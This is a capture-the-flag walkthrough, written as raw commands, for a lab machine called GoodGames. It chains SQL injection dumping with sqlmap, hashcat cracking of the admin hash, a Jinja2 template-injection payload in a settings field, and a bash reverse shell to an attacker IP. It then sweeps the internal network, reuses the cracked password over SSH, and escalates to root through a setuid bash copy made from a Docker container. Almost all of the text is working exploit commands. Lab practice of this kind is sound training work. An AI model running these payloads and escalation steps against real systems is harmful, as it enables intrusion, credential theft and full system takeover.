ping 10.10.11.130
whatweb 10.10.11.130

echo "10.10.11.130 goodgames.htb" >> /etc/hosts

nmap -sCV -O 10.10.11.130

start Burp Suite
intercept /login page -> "copy to file" login.req

sqlmap -r login.req
sqlmap -r login.req --dbs
sqlmap -r login.req -D main --tables
sqlmap -r login.req -D main -T user --columns
sqlmap -r login.req -D main -T user --columns --dump

+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+

nano hashes.txt
2b22337f218b2d82dfc3b6f77e7cb8ec

hashcat -m 0 hashes.txt ../rockyou
2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator


#web
login with admin account -> click settings

#terminal 1
echo "10.10.11.130 internal-administration.goodgames.htb" >> /etc/hosts

nc -nvlp 9001

#web
go to http://internal-administration.goodgames.htb/settings

change the full name to {{namespace.__init__.__globals__.os.popen('id').read()}} -> save all
check for results

{{namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<kali ip>/9001 0>&1"').read()}} -> save all
get shell


#terminal 1
cd /home/augustus
cat user.txt -> get flag (af265edafeb6186bb10e70932f6a00d3)

for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done; -> get 172.19.0.1 and 172.19.0.2

for p in {1..65535}; do echo > /dev/tcp/172.19.0.1/$p && echo "$p open"; done 2>/dev/null -> get 80 and 22
ssh port is open

script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset
screen

ssh augustus:superadministrator@172.19.0.1

open a new root (docker) shell in another terminal using the same method as above

#terminal 1
cp /bin/bash .
ls -la -> check auguster on bash

#terminal 2
chown root:root bash
chmod 4777 bash
ls -la -> check root and permissons (-rwsrwxrwx) on bash
./bash -p

cat /root/root.txt -> get flag (e6277a3ec76e27f2b9a03a53e6e1c891)